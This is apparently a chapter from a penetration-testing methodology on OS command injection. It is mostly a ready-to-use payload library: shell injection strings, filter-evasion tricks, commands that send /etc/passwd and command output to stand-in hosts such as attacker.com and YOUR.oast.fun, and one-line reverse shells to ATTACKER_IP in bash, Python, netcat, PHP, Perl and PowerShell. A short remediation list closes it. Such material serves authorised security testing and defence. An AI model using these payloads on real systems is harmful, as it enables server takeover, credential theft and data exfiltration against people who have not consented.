---
title: "OS Command Injection"
date: 2026-02-24
draft: false
---

# OS Command Injection

> **Severity**: Critical
> **CWE**: CWE-78
> **OWASP**: A03:2021 – Injection

---

## What Is Command Injection?

OS Command Injection occurs when an application passes **user-controlled data to a system shell** (or equivalent OS execution function) without adequate sanitization. The attacker's input is interpreted as shell commands rather than data — resulting in arbitrary code execution with the same privileges as the web server process.

Even a single injectable parameter can result in full server compromise: credential harvesting, lateral movement, persistent access, data exfiltration.

### Injection vs Blind Injection

| Type | Feedback | Detection |
|------|----------|-----------|
| **In-band** | Command output returned in HTTP response | Direct — read output |
| **Blind (time-based)** | No output — only timing | `sleep`, `ping -c N` |
| **Blind (OOB)** | No output — out-of-band channel | DNS/HTTP to Collaborator |
| **Blind (error-based)** | Stderr returned, stdout not | Error messages in response |

---

## Attack Surface Map

### Common Injection Points

```
# Features that typically call OS commands:
- Image/video processing (ImageMagick convert, ffmpeg)
- PDF generation (wkhtmltopdf, headless Chrome)
- File format conversion (LibreOffice, pandoc)
- Ping / network diagnostic tools
- DNS lookup utilities
- Archive operations (zip, tar, unzip)
- File permission tools (chmod via UI)
- Email sending via sendmail/exim
- Git operations (deploy hooks, web git interfaces)
- CI/CD pipeline triggers
- Backup utilities
- Log file viewers (tail, grep via web)
- SSL certificate generation (openssl)
- QR code generators using external tools
- WhoIs / traceroute functionality
- Custom script runners

# Parameters likely passed to shell:
filename, file, path, dir, folder, cmd, exec, command, run,
ip, host, domain, url, name, query, input, output, format,
src, dest, from, to, subject, recipient, lang, locale,
version, branch, tag, ref, repo
```

---

## Discovery Checklist

### Phase 1 — Passive Identification

- [ ] Identify all features that likely invoke system commands (see surface map above)
- [ ] Look for parameters whose values appear in filenames, paths, or command arguments
- [ ] Check error messages — OS-level errors (e.g., `sh: command not found`) confirm shell execution
- [ ] Identify file upload features that process files server-side
- [ ] Look for any "execute", "run", "test", "check", "scan" functionality
- [ ] Examine JavaScript for parameters assembled into command-like strings sent to backend

### Phase 2 — Active Detection

- [ ] Inject time delay: `; sleep 5` — observe if response takes 5 extra seconds
- [ ] Inject null command: `& echo x` — observe if `x` appears in response
- [ ] Inject DNS OOB: `; nslookup YOUR.oast.fun` — check Collaborator for DNS hit
- [ ] Try all shell metacharacters: `;`, `|`, `||`, `&&`, `&`, `$(...)`, `` ` ` ``
- [ ] Test in all parameter positions including filename, format, codec, language parameters
- [ ] Test with common OS commands: `id`, `whoami`, `uname -a`, `pwd`
- [ ] Inject into file upload filename: `file.jpg; id`
- [ ] Test in HTTP headers if they are passed to shell (User-Agent in log parsers, etc.)

### Phase 3 — Confirm & Escalate

- [ ] Confirm execution: `id`, `whoami` output in response
- [ ] Confirm file read: `cat /etc/passwd`
- [ ] Confirm outbound connectivity: `curl http://attacker.com/`
- [ ] Establish reverse shell or implant
- [ ] Enumerate environment: `env`, `printenv`
- [ ] Check sudo: `sudo -l`
- [ ] Check SUID binaries: `find / -perm -u=s -type f 2>/dev/null`
- [ ] Read credentials: `.env`, `config.php`, `application.yml`, `database.yml`

---

## Payload Library

### Section 1 — Metacharacter Injection (Linux)

```bash
-- Semicolon — execute after previous command:
; id
; whoami
; cat /etc/passwd
; ls /

-- Pipe — pipe output to next command:
| id
| whoami
| cat /etc/passwd
| ls -la

-- Double ampersand — execute if previous command succeeds:
&& id
&& whoami

-- Double pipe — execute if previous command fails:
|| id
|| whoami

-- Background/out-of-order:
& id &
& id
id &

-- Backticks — command substitution:
`id`
`cat /etc/passwd`
`nslookup attacker.com`

-- $() — preferred command substitution:
$(id)
$(cat /etc/passwd)
$(nslookup attacker.com)
$(curl http://attacker.com/$(id))

-- Newline — acts as command separator in many shells:
%0a id
%0a whoami
%0a cat /etc/passwd

-- Null byte:
%00 ; id
```

### Section 2 — Windows Metacharacters

```cmd
-- Semicolon (limited support):
; dir

-- Ampersand:
& dir
& whoami
& type C:\Windows\win.ini

-- Double ampersand:
&& dir
&& whoami

-- Pipe:
| dir
| whoami

-- Or:
|| dir

-- Backtick substitution (PowerShell):
`dir`

-- Inline expression:
$(dir)    -- PowerShell

-- Command separators:
cmd /c "dir"
powershell -c "Get-Process"
```

### Section 3 — Blind Command Injection (Time-Based)

```bash
-- Linux sleep:
; sleep 5
| sleep 5
&& sleep 5
$(sleep 5)
`sleep 5`
; sleep 5 #

-- Linux ping (N packets ≈ N seconds):
; ping -c 5 127.0.0.1
| ping -c 5 localhost
$(ping -c 5 127.0.0.1)

-- Windows ping:
& ping -n 5 127.0.0.1
& ping -n 5 localhost

-- PowerShell:
; powershell -c "Start-Sleep 5"
& powershell -c Start-Sleep(5)
```

### Section 4 — Blind Command Injection (OOB / DNS)

```bash
-- DNS lookup (Burp Collaborator / interactsh):
; nslookup YOUR.oast.fun
; nslookup `id`.YOUR.oast.fun
| nslookup $(whoami).YOUR.oast.fun
$(nslookup YOUR.oast.fun)
`nslookup YOUR.oast.fun`
; host YOUR.oast.fun
; dig YOUR.oast.fun

-- Data exfiltration via DNS subdomain:
; nslookup $(id | base64 | tr -d '=\n').YOUR.oast.fun
; nslookup $(whoami).YOUR.oast.fun
; nslookup $(cat /etc/hostname).YOUR.oast.fun

-- HTTP OOB:
; curl http://YOUR.oast.fun/$(id | base64 | tr -d '=')
; wget -q http://YOUR.oast.fun/?x=$(whoami)
; curl "http://YOUR.oast.fun/?user=$(id)&host=$(hostname)"

-- Windows:
& nslookup YOUR.oast.fun
& powershell -c "Invoke-WebRequest http://YOUR.oast.fun/$(whoami)"

-- SSRF → CMDi chaining (exfil via DNS):
; curl "http://YOUR.burpcollaborator.net/$(cat /etc/passwd | head -1 | base64 | tr -d '\n')"
```

### Section 5 — Bypass Techniques

#### Space Bypass

```bash
-- If spaces are filtered:
${IFS}               -- Internal Field Separator (default = space)
$IFS$9               -- IFS with positional param
{IFS}
%09                  -- tab character
%20                  -- URL-encoded space (sometimes helps)
<                    -- input redirect: cat</etc/passwd
{cat,/etc/passwd}    -- brace expansion (no spaces)

-- Examples:
cat${IFS}/etc/passwd
cat${IFS}${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
cat<>/etc/passwd
```

#### Quote Bypass

```bash
-- Insert quotes to break keyword detection:
w'h'o'a'm'i
w"h"o"a"m"i
wh""oami
wh''oami
cat /et"c"/pa"sswd"
```

#### Keyword/Blacklist Bypass

```bash
-- If 'cat' is blocked:
less /etc/passwd
more /etc/passwd
head /etc/passwd
tail /etc/passwd
od /etc/passwd
xxd /etc/passwd
tac /etc/passwd        -- reverse cat
strings /etc/passwd
diff /dev/null /etc/passwd

-- If 'id' is blocked:
who
whoami
w
groups

-- Variable-based bypass:
c=at; $c /etc/passwd
cmd=id; $cmd
a=c;b=at;$a$b /etc/passwd

-- Glob expansion:
/???/cat /etc/passwd   -- /bin/cat
/???/p?ng attacker.com
cat /et?/passw?

-- Base64 decode + execute:
echo aWQ= | base64 -d | bash       -- 'id' base64-encoded
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
$(echo "d2hvYW1p" | base64 -d)     -- 'whoami' base64-encoded

-- Hex decode:
echo 69 64 | xxd -r -p | bash       -- 'id' in hex

-- Python fallback:
python -c "import os;os.system('id')"
python3 -c "import os;os.system('id')"
perl -e "system('id')"
ruby -e "exec('id')"
php -r "system('id');"
node -e "require('child_process').execSync('id').toString()"
```

#### Special Character Bypass

```bash
-- Backslash in command name:
who\ami
ca\t /etc/passwd
c\at /etc/passwd

-- Dollar sign in command:
$'cat' /etc/passwd
$'\143at' /etc/passwd    -- 'c' = \143 in octal

-- Tildes and other ignored chars (bash):
cat /etc/passwd
```

#### Filter Bypass in Path Argument

```bash
-- Path traversal within command args:
cat /etc/../etc/passwd
cat /etc/./passwd
cat ////etc////passwd

-- Relative path:
cat etc/passwd           -- if CWD is /
cd / && cat etc/passwd
```

---

### Section 6 — Reverse Shells

#### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

-- Without spaces (space bypass):
bash${IFS}-i${IFS}>%26/dev/tcp/ATTACKER_IP/4444${IFS}0>%261
```

#### Python

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Netcat

```bash
nc -e /bin/bash ATTACKER_IP 4444
nc -e /bin/sh ATTACKER_IP 4444

-- Without -e:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

#### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

#### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

#### PowerShell (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

-- Encoded:
powershell -enc BASE64_OF_ABOVE
```

---

### Section 7 — File-Based Injection (Filenames)

A common and overlooked vector: when filenames are passed to system commands.

```bash
-- In upload filename:
shell.php;id
test.jpg|id
../../etc/passwd
file.jpg$(id)
file.jpg`id`
file.jpg%0aid

-- In file processing endpoints:
/convert?file=image.jpg; ls -la
/thumbnail?src=photo.png | cat /etc/passwd
/compress?name=archive.zip; sleep 5

-- ImageMagick (input filename as command):
;id.jpg
|id.jpg
$(id).jpg

-- Archive extraction (zip slip):
../../../var/www/html/shell.php (path in zip header)
```

---

### Section 8 — Exfiltration Without Direct Connectivity

```bash
-- DNS-based exfiltration (character by character):
for i in $(cat /etc/passwd | xxd -p | tr -d '\n' | fold -w 30); do nslookup $i.YOUR.oast.fun; done

-- HTTP GET with base64 data:
curl "http://YOUR.oast.fun/?d=$(cat /etc/passwd | base64 | tr -d '\n' | tr '+/' '_-')"

-- Use time-based to confirm file content (when no outbound):
; if [ $(cat /etc/passwd | md5sum | cut -c1) = 'a' ]; then sleep 5; fi

-- Write to accessible web directory then retrieve:
; cp /etc/passwd /var/www/html/leak.txt
# Then: GET /leak.txt
```

---

## Tools

```bash
# commix — automated command injection:
git clone https://github.com/commixproject/commix
python commix.py -u "https://target.com/page?input=INJECT_HERE"
python commix.py -u "https://target.com/page" --data="field=INJECT_HERE"
python commix.py -u "https://target.com/page?input=INJECT_HERE" --os-shell
python commix.py -u "https://target.com/page?input=INJECT_HERE" --technique=T  # time-based
python commix.py -r burp_request.txt

# Manual OOB listener:
interactsh-client -v
nc -lvnp 4444

# Payload wordlist for ffuf:
ffuf -w ~/wordlists/cmdi.txt -u "https://target.com/ping?ip=FUZZ" -fw 50

# Burp Intruder — time-based:
# Payload: ; sleep 5
# Grep for: Response time > 5000ms
```

---

## Remediation Reference

- **Avoid system calls entirely** where possible — use language-native APIs (e.g., Python's `zipfile` instead of calling `zip`)
- **Use parameterized APIs** for OS functions: `subprocess.run(['ls', user_input])` (no shell=True) instead of `os.system('ls ' + user_input)`
- **Whitelist input** for parameters that must be passed to OS: only permit alphanumeric + specific safe chars
- **Escape shell metacharacters** if OS calls cannot be avoided: use `shlex.quote()` (Python), `escapeshellarg()` (PHP)
- **Avoid `shell=True`** in Python subprocess — it enables shell interpretation of the command string
- **Run with least privilege** — the web process should not run as root; contain blast radius with OS-level isolation

---

*Part of the Web Application Penetration Testing Methodology series.*
*Previous: [Chapter 04 — XPath Injection](04_XPath.md) | Next: [Chapter 06 — SSTI](06_SSTI.md)*
